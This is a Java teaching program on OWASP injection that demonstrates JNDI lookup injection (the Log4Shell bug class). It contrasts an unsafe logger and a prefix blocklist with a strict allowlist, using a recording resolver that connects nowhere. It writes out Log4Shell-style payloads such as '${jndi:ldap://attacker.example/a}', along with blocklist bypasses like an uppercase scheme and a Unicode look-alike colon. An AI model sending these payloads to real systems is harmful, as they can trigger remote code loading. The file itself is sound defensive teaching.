// OWASP Top 10 2021: A03:2021 Injection, JNDI lookup injection (CWE-917, CWE-74)
// https://owasp.org/Top10/A03_2021-Injection/
//
// JNDI's Context.lookup(name) accepts URLs as names (ldap://, rmi://,
// dns://, iiop://), and a directory answer can describe an object to be
// rebuilt locally: a serialized object, or a Reference naming a factory
// class. Looking up an attacker-chosen name therefore means connecting to
// the attacker's server and deserializing or instantiating whatever it
// returns. That is the bug class behind Log4Shell (CVE-2021-44228): the
// logging library expanded ${jndi:ldap://...} lookups inside logged
// MESSAGES, so any logged header or form field became a lookup. Never
// evaluate lookups or expressions on data, and pass only names that match
// a strict allowlist (here: the local java:comp/env namespace) to
// lookup(). This program only checks names; it performs no lookups at all.
import java.util.ArrayList;
import java.util.List;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

public class A03_Injection_JndiLookup {
    public static void main(String[] args) {
        // 1. The Log4Shell pattern: a logger that expands ${...} lookups in the final message
        String userAgent = "${jndi:ldap://attacker.example/a}";
        RecordingResolver r1 = new RecordingResolver();
        System.out.println("noncompliant log line: " + logExpandingEverything("login from UA {}", userAgent, r1));
        System.out.println("  lookups the logger attempted: " + r1.requested);

        RecordingResolver r2 = new RecordingResolver();
        System.out.println("compliant log line:    " + logTreatingArgsAsData("login from UA {}", userAgent, r2));
        System.out.println("  lookups the logger attempted: " + r2.requested);

        // 2. Names a program might pass to Context.lookup
        List<String> names = List.of(
                "java:comp/env/jdbc/orders",
                "java:comp/env/mail/Session",
                "ldap://attacker.example/Exploit",
                "LDAP://attacker.example/Exploit",
                "rmi://10.0.0.5:1099/obj",
                "dns:attacker.example",
                " java:comp/env/jdbc/orders",
                "java:comp/env/../../ldap:x",
                "java:comp/env/jdbc/orders?x=ldap://a",
                "java：comp/env/jdbc/orders");
        for (String n : names) {
            System.out.printf("%-40s noncompliant: %-6s compliant: %s%n",
                    visible(n), noncompliantCheck(n) ? "lookup" : "refuse", isAllowedJndiName(n) ? "lookup" : "refuse");
        }
    }

    // Noncompliant: a blocklist of "dangerous" prefixes, case-sensitive
    static boolean noncompliantCheck(String name) {
        return !(name.startsWith("ldap:") || name.startsWith("rmi:"));
    }

    // Compliant: one exact namespace and an ASCII-only name, matched as a whole.
    // No scheme other than java: can appear, and look-alike Unicode never matches.
    private static final Pattern ALLOWED = Pattern.compile("java:comp/env/[A-Za-z][A-Za-z0-9_]*(/[A-Za-z][A-Za-z0-9_]*)*");

    static boolean isAllowedJndiName(String name) {
        return ALLOWED.matcher(name).matches();
    }

    // A toy logger that substitutes {} and THEN expands ${prefix:value} anywhere in the result
    static String logExpandingEverything(String template, String arg, RecordingResolver resolver) {
        String message = template.replace("{}", arg);
        return expand(message, resolver);
    }

    // Compliant: lookups (if any) only in the developer's template, never in arguments
    static String logTreatingArgsAsData(String template, String arg, RecordingResolver resolver) {
        return expand(template, resolver).replace("{}", arg);
    }

    private static final Pattern LOOKUP = Pattern.compile("\\$\\{([a-z]+):([^}]*)}");

    static String expand(String s, RecordingResolver resolver) {
        Matcher m = LOOKUP.matcher(s);
        StringBuilder sb = new StringBuilder();
        while (m.find()) {
            m.appendReplacement(sb, Matcher.quoteReplacement(resolver.resolve(m.group(1), m.group(2))));
        }
        m.appendTail(sb);
        return sb.toString();
    }

    // Stands in for a real JNDI context: records the request, never connects anywhere
    static final class RecordingResolver {
        final List<String> requested = new ArrayList<>();

        String resolve(String prefix, String name) {
            requested.add(prefix + ":" + name);
            return "<result of " + prefix + " lookup>";
        }
    }

    static String visible(String s) {
        StringBuilder sb = new StringBuilder("\"");
        s.codePoints().forEach(c -> sb.append(c < 0x7F ? Character.toString(c) : String.format("\\u%04X", c)));
        return sb.append('"').toString();
    }
}

/* Output:
noncompliant log line: login from UA <result of jndi lookup>
  lookups the logger attempted: [jndi:ldap://attacker.example/a]
compliant log line:    login from UA ${jndi:ldap://attacker.example/a}
  lookups the logger attempted: []
"java:comp/env/jdbc/orders"              noncompliant: lookup compliant: lookup
"java:comp/env/mail/Session"             noncompliant: lookup compliant: lookup
"ldap://attacker.example/Exploit"        noncompliant: refuse compliant: refuse
"LDAP://attacker.example/Exploit"        noncompliant: lookup compliant: refuse
"rmi://10.0.0.5:1099/obj"                noncompliant: refuse compliant: refuse
"dns:attacker.example"                   noncompliant: lookup compliant: refuse
" java:comp/env/jdbc/orders"             noncompliant: lookup compliant: refuse
"java:comp/env/../../ldap:x"             noncompliant: lookup compliant: refuse
"java:comp/env/jdbc/orders?x=ldap://a"   noncompliant: lookup compliant: refuse
"java\uFF1Acomp/env/jdbc/orders"         noncompliant: lookup compliant: refuse
*/
